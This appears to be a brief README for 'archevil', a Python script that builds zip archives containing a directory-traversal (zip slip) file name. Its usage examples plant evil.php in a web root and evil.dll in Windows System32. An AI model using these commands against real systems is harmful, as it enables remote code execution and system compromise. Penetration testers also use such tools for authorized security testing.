# archevil
Create an archive containing a file with directory traversal

## Usage

Run the ```archevil.py``` Python script with the following parameters:
```
# Unix
python3 archevil.py evil.php -d 10 -p unix --path /var/www/html/ -o evil.zip

# Windows
python3 archevil.py evil.dll -d 10 -p win --path "WINDOWS\\System32\\" -o evil.zip
```

## Inspired By
* [evilarc](https://github.com/cesarsotovalero/zip-slip-exploit-example) (Python 2)
